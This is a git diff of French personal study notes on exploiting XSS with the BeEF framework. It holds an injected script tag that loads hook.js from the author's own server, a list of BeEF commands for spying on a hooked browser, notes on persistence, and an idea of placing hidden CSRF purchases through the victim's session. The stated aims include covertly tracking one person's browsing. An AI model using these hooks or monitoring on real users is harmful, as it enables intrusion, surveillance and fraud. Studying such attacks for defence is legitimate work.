@@ -318,7 +318,7 @@ si le nombre de caractères est limité ==> Burp suite permet d'intercepter la r
 
 Il existe plusieurs frameworks d'exploitation des failles XSS : BeEF-xss, The Cross-Site Scripting Framework (XSSF), OWASP Xenotix XSS Exploit Framework, Autopwn. Ainsi que des frameworks pour tester automatiquement s'il semble y avoir des vulnérabilités xss sur une page : Nesus, Nikto, SOAP UI tool...
 
-BeEF-xss est un framework d'exploitation Web codé en PHP & JavaScript, se concentre sur l'exploitation de vulnérabilités du coté navigateur (client). Consiste à exploiter un vecteur d’attaque sur une machine cliente (vecteur XSS, CSRF, etc) pour ouvrir une porte d’accès au système, et d’examiner les exploitations potentielles dans le contexte courant du navigateur. Une fois une cible rattachée à BeEF, le framework exploite un tunnel asynchrone (principalement généré par Javascript/Ajax) afin de lancer l’exécution de modules dans le navigateur de la cible, et ainsi perpétuer des attaques à l’encontre du système. 
+BeEF-xss est un framework d'exploitation Web codé en PHP & JavaScript, se concentre sur l'exploitation de vulnérabilités du coté navigateur (client). Consiste à exploiter un vecteur d’attaque sur une machine cliente (vecteur XSS, CSRF, etc) pour ouvrir une porte d’accès au système, et d’examiner les exploitations potentielles dans le contexte courant du navigateur. Une fois une cible rattachée à BeEF, le framework exploite un tunnel asynchrone (principalement généré par Javascript/Ajax) afin de lancer l’exécution de modules dans le navigateur de la cible, et ainsi perpétuer des attaques à l’encontre du système. Open source project, started in 2006, last push 5 days ago on github, up to date
 
 - lancer un serveur Linux avec beef installé dessus (voir Ngrok, faut ajouter des informations dans le fichier de config) // port forwarding. 
 - on lance beef, et on obtient : l'url de l'interface administration + le hook.js à injecter
@@ -433,7 +433,29 @@ service apache2 restart
 [installer un serveur web à la maison](https://www.magentix.fr/blog/un-serveur-web-a-la-maison.html)
 J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto Ngrok de Grafikart](https://www.youtube.com/watch?v=PylWF44i2pY) Ngrok = outil qui permet de créer un tunnel vers votre environnement de développement en local. Ngrok va venir créer un tunnel. On ouvre ngrok, on dit ok je veux me connecter à toi. Là on ouvre un tunnel, comme un vpn, entre notre ordinateur et le serveur de ngrok, qui lui va nous créer un url sur le serveur de ngrok, que les utilisateurs vont pouvoir, eux, accéder directement au serveur qui est sur notre ordinateur. 
 
-## Informations
+## Exploitation
+
+### A. Malicious code
+
+````
+<script src="http://<IP de mon serveur>:3000/hook.js"></script>
+// The <script> HTML element is used to embed executable code or data; this is typically used to embed or refer to JavaScript code
+// J'ai un serveur sur <IP de mon serveur> où sur le port 80 y a un serveur HTTP Apache + port 3000 serveur beef
+// quand le DOM de ma victime execute la ligne en haut, ca exécute le fichier hook.js, qui est un script en JS
+
+// si je tappe http://<adresse ip de mon serveur>:3000/hook.js je peux voir le script
+// The hook.js is built dynamically server side depending on the config options for beef
+// core/main/handlers/hookedbrowsers.rb - Line 50 - call to build_beefjs!()
+// core/main/handlers/modules/beefjs.rb - Line 16 - definition of build_beefjs!()
+````
+
+--> Quel est l'objectif ? Que veut-on faire sur l'ordinateur de la victime ?
+- historique du navigateur
+- afficher "arrêtes de jouer à lol" dès qu'il y joue
+- persistant, avoir toujours accès même après qu'il ferme l'onglet
+
+
+#### B. UI Panel : Details & Commands
 
 |Details|A quoi ca correspond|
 |----|----|
@@ -451,41 +473,11 @@ J'ai fait avec le port forwarding, mais possibilité de faire avec Ngrok : [Tuto
 |screen width||
 |host os family|OS X|
 
-Logs
-- si la fenêtre du navigateur a perdu le focus ou a retrouvé le focus
-- mouse click + position x;y
-- has executed instructions ....
-
-
-
-## Commandes Beef-xss & Malicious code
-
-Quel est l'objectif ? Que veut-on faire sur l'ordinateur de la victime ?
-- Quelles commandes va-t-on appliquer ? 
-- On peut imaginer que en même temps que la personne est sur notre site malicieux, en background on ouvre amazon, et on commande un truc quon va s’envoyer à nous-même (XSRF) = à travers la connexion client serveur qui est déjà faite, on peut faire une requête qui est une transaction malveillante, l’utilisateur ne le voit pas visuellement car ca se passe en background ⇒ c’est une cross site request foregery ⇒ exploits server trust in user takes advantage of saved authentication
-
-Informations qu'on a :
-- les logs : là où clique, événements sur la page du côté de la victime
-- details : 
-
-#### A. Commandes Beef-xss
-
-[User Guide](https://github.com/beefproject/beef/wiki/Introducing-BeEF)
-
---> historique du navigateur ?
---> + persistant, que meme quand il ferme l'onglet j'ai tjr des acces
-
-get geolocation (third-party) : 
-- j'arrive à avoir le FAI
-- j'arrive à avoir l'adresse ip
-- j'arrive à avoir la ville, country code, region
-
-detect social networks : ca marche pour facebook, détecte si facebook est authentifié
-
-blockui modal dialog ==> bloquer la fenetre avec un message
-
-redirect browser
-
+|Logs |
+|----|
+|si la fenêtre du navigateur a perdu le focus ou a retrouvé le focus|
+|mouse click + position x;y|
+|has executed instructions ....|
 
 |commande|explication|
 |-----|------|
@@ -499,26 +491,36 @@ redirect browser
 |redirect browser|redirect the selected hooked browser to the adress specified in the 'redirected URL' input|
 |...||
 
+get geolocation (third-party) : 
+- j'arrive à avoir le FAI
+- j'arrive à avoir l'adresse ip
+- j'arrive à avoir la ville, country code, region
 
-#### B. Malicious code
+detect social networks : ca marche pour facebook, détecte si facebook est authentifié
+
+blockui modal dialog ==> bloquer la fenetre avec un message
+
+redirect browser
+
+#### C. 
+
+- être notifiée à chaque fois qu'il va ouvrir discord et aller jouer à lol ==> ca demande de savoir ce qu'il fait sur son navigateur
+- mettre un pop-up sur son navigateur "arrêtes de jouer à lol"
 
 
-beef = open source project, started in 2006, last push 5 days ago on github
+[User Guide](https://github.com/beefproject/beef/wiki/Introducing-BeEF)
 
 
 
-- Y a quoi dans le hook.js ?
-hook.js, fichier qui, quand il est exécuté donne le hook à beef. voir la doc github pr architecture et js hook
 
-<script></script> in JS
-
-The BeEF launches a BeEF instance which is a combination of the UI server(the UI which is used to launch attacks and shows the various exploits) and the communications server which coordinates and communicates with the hooked browsers. These 2 servers in collaboration makes BeEF work.
 
 
 
 
 
 ## Persistance
+
+--> + persistant, que meme quand il ferme l'onglet j'ai tjr des acces
 
 https://github.com/beefproject/beef/wiki/Persistence
 
@@ -591,6 +593,7 @@ left+cmd pour uncapture souris
 ctrl+alt
 ```
 
+- On peut imaginer que en même temps que la personne est sur notre site malicieux, en background on ouvre amazon, et on commande un truc quon va s’envoyer à nous-même (XSRF) = à travers la connexion client serveur qui est déjà faite, on peut faire une requête qui est une transaction malveillante, l’utilisateur ne le voit pas visuellement car ca se passe en background ⇒ c’est une cross site request foregery ⇒ exploits server trust in user takes advantage of saved authentication
 
 
 ## Links
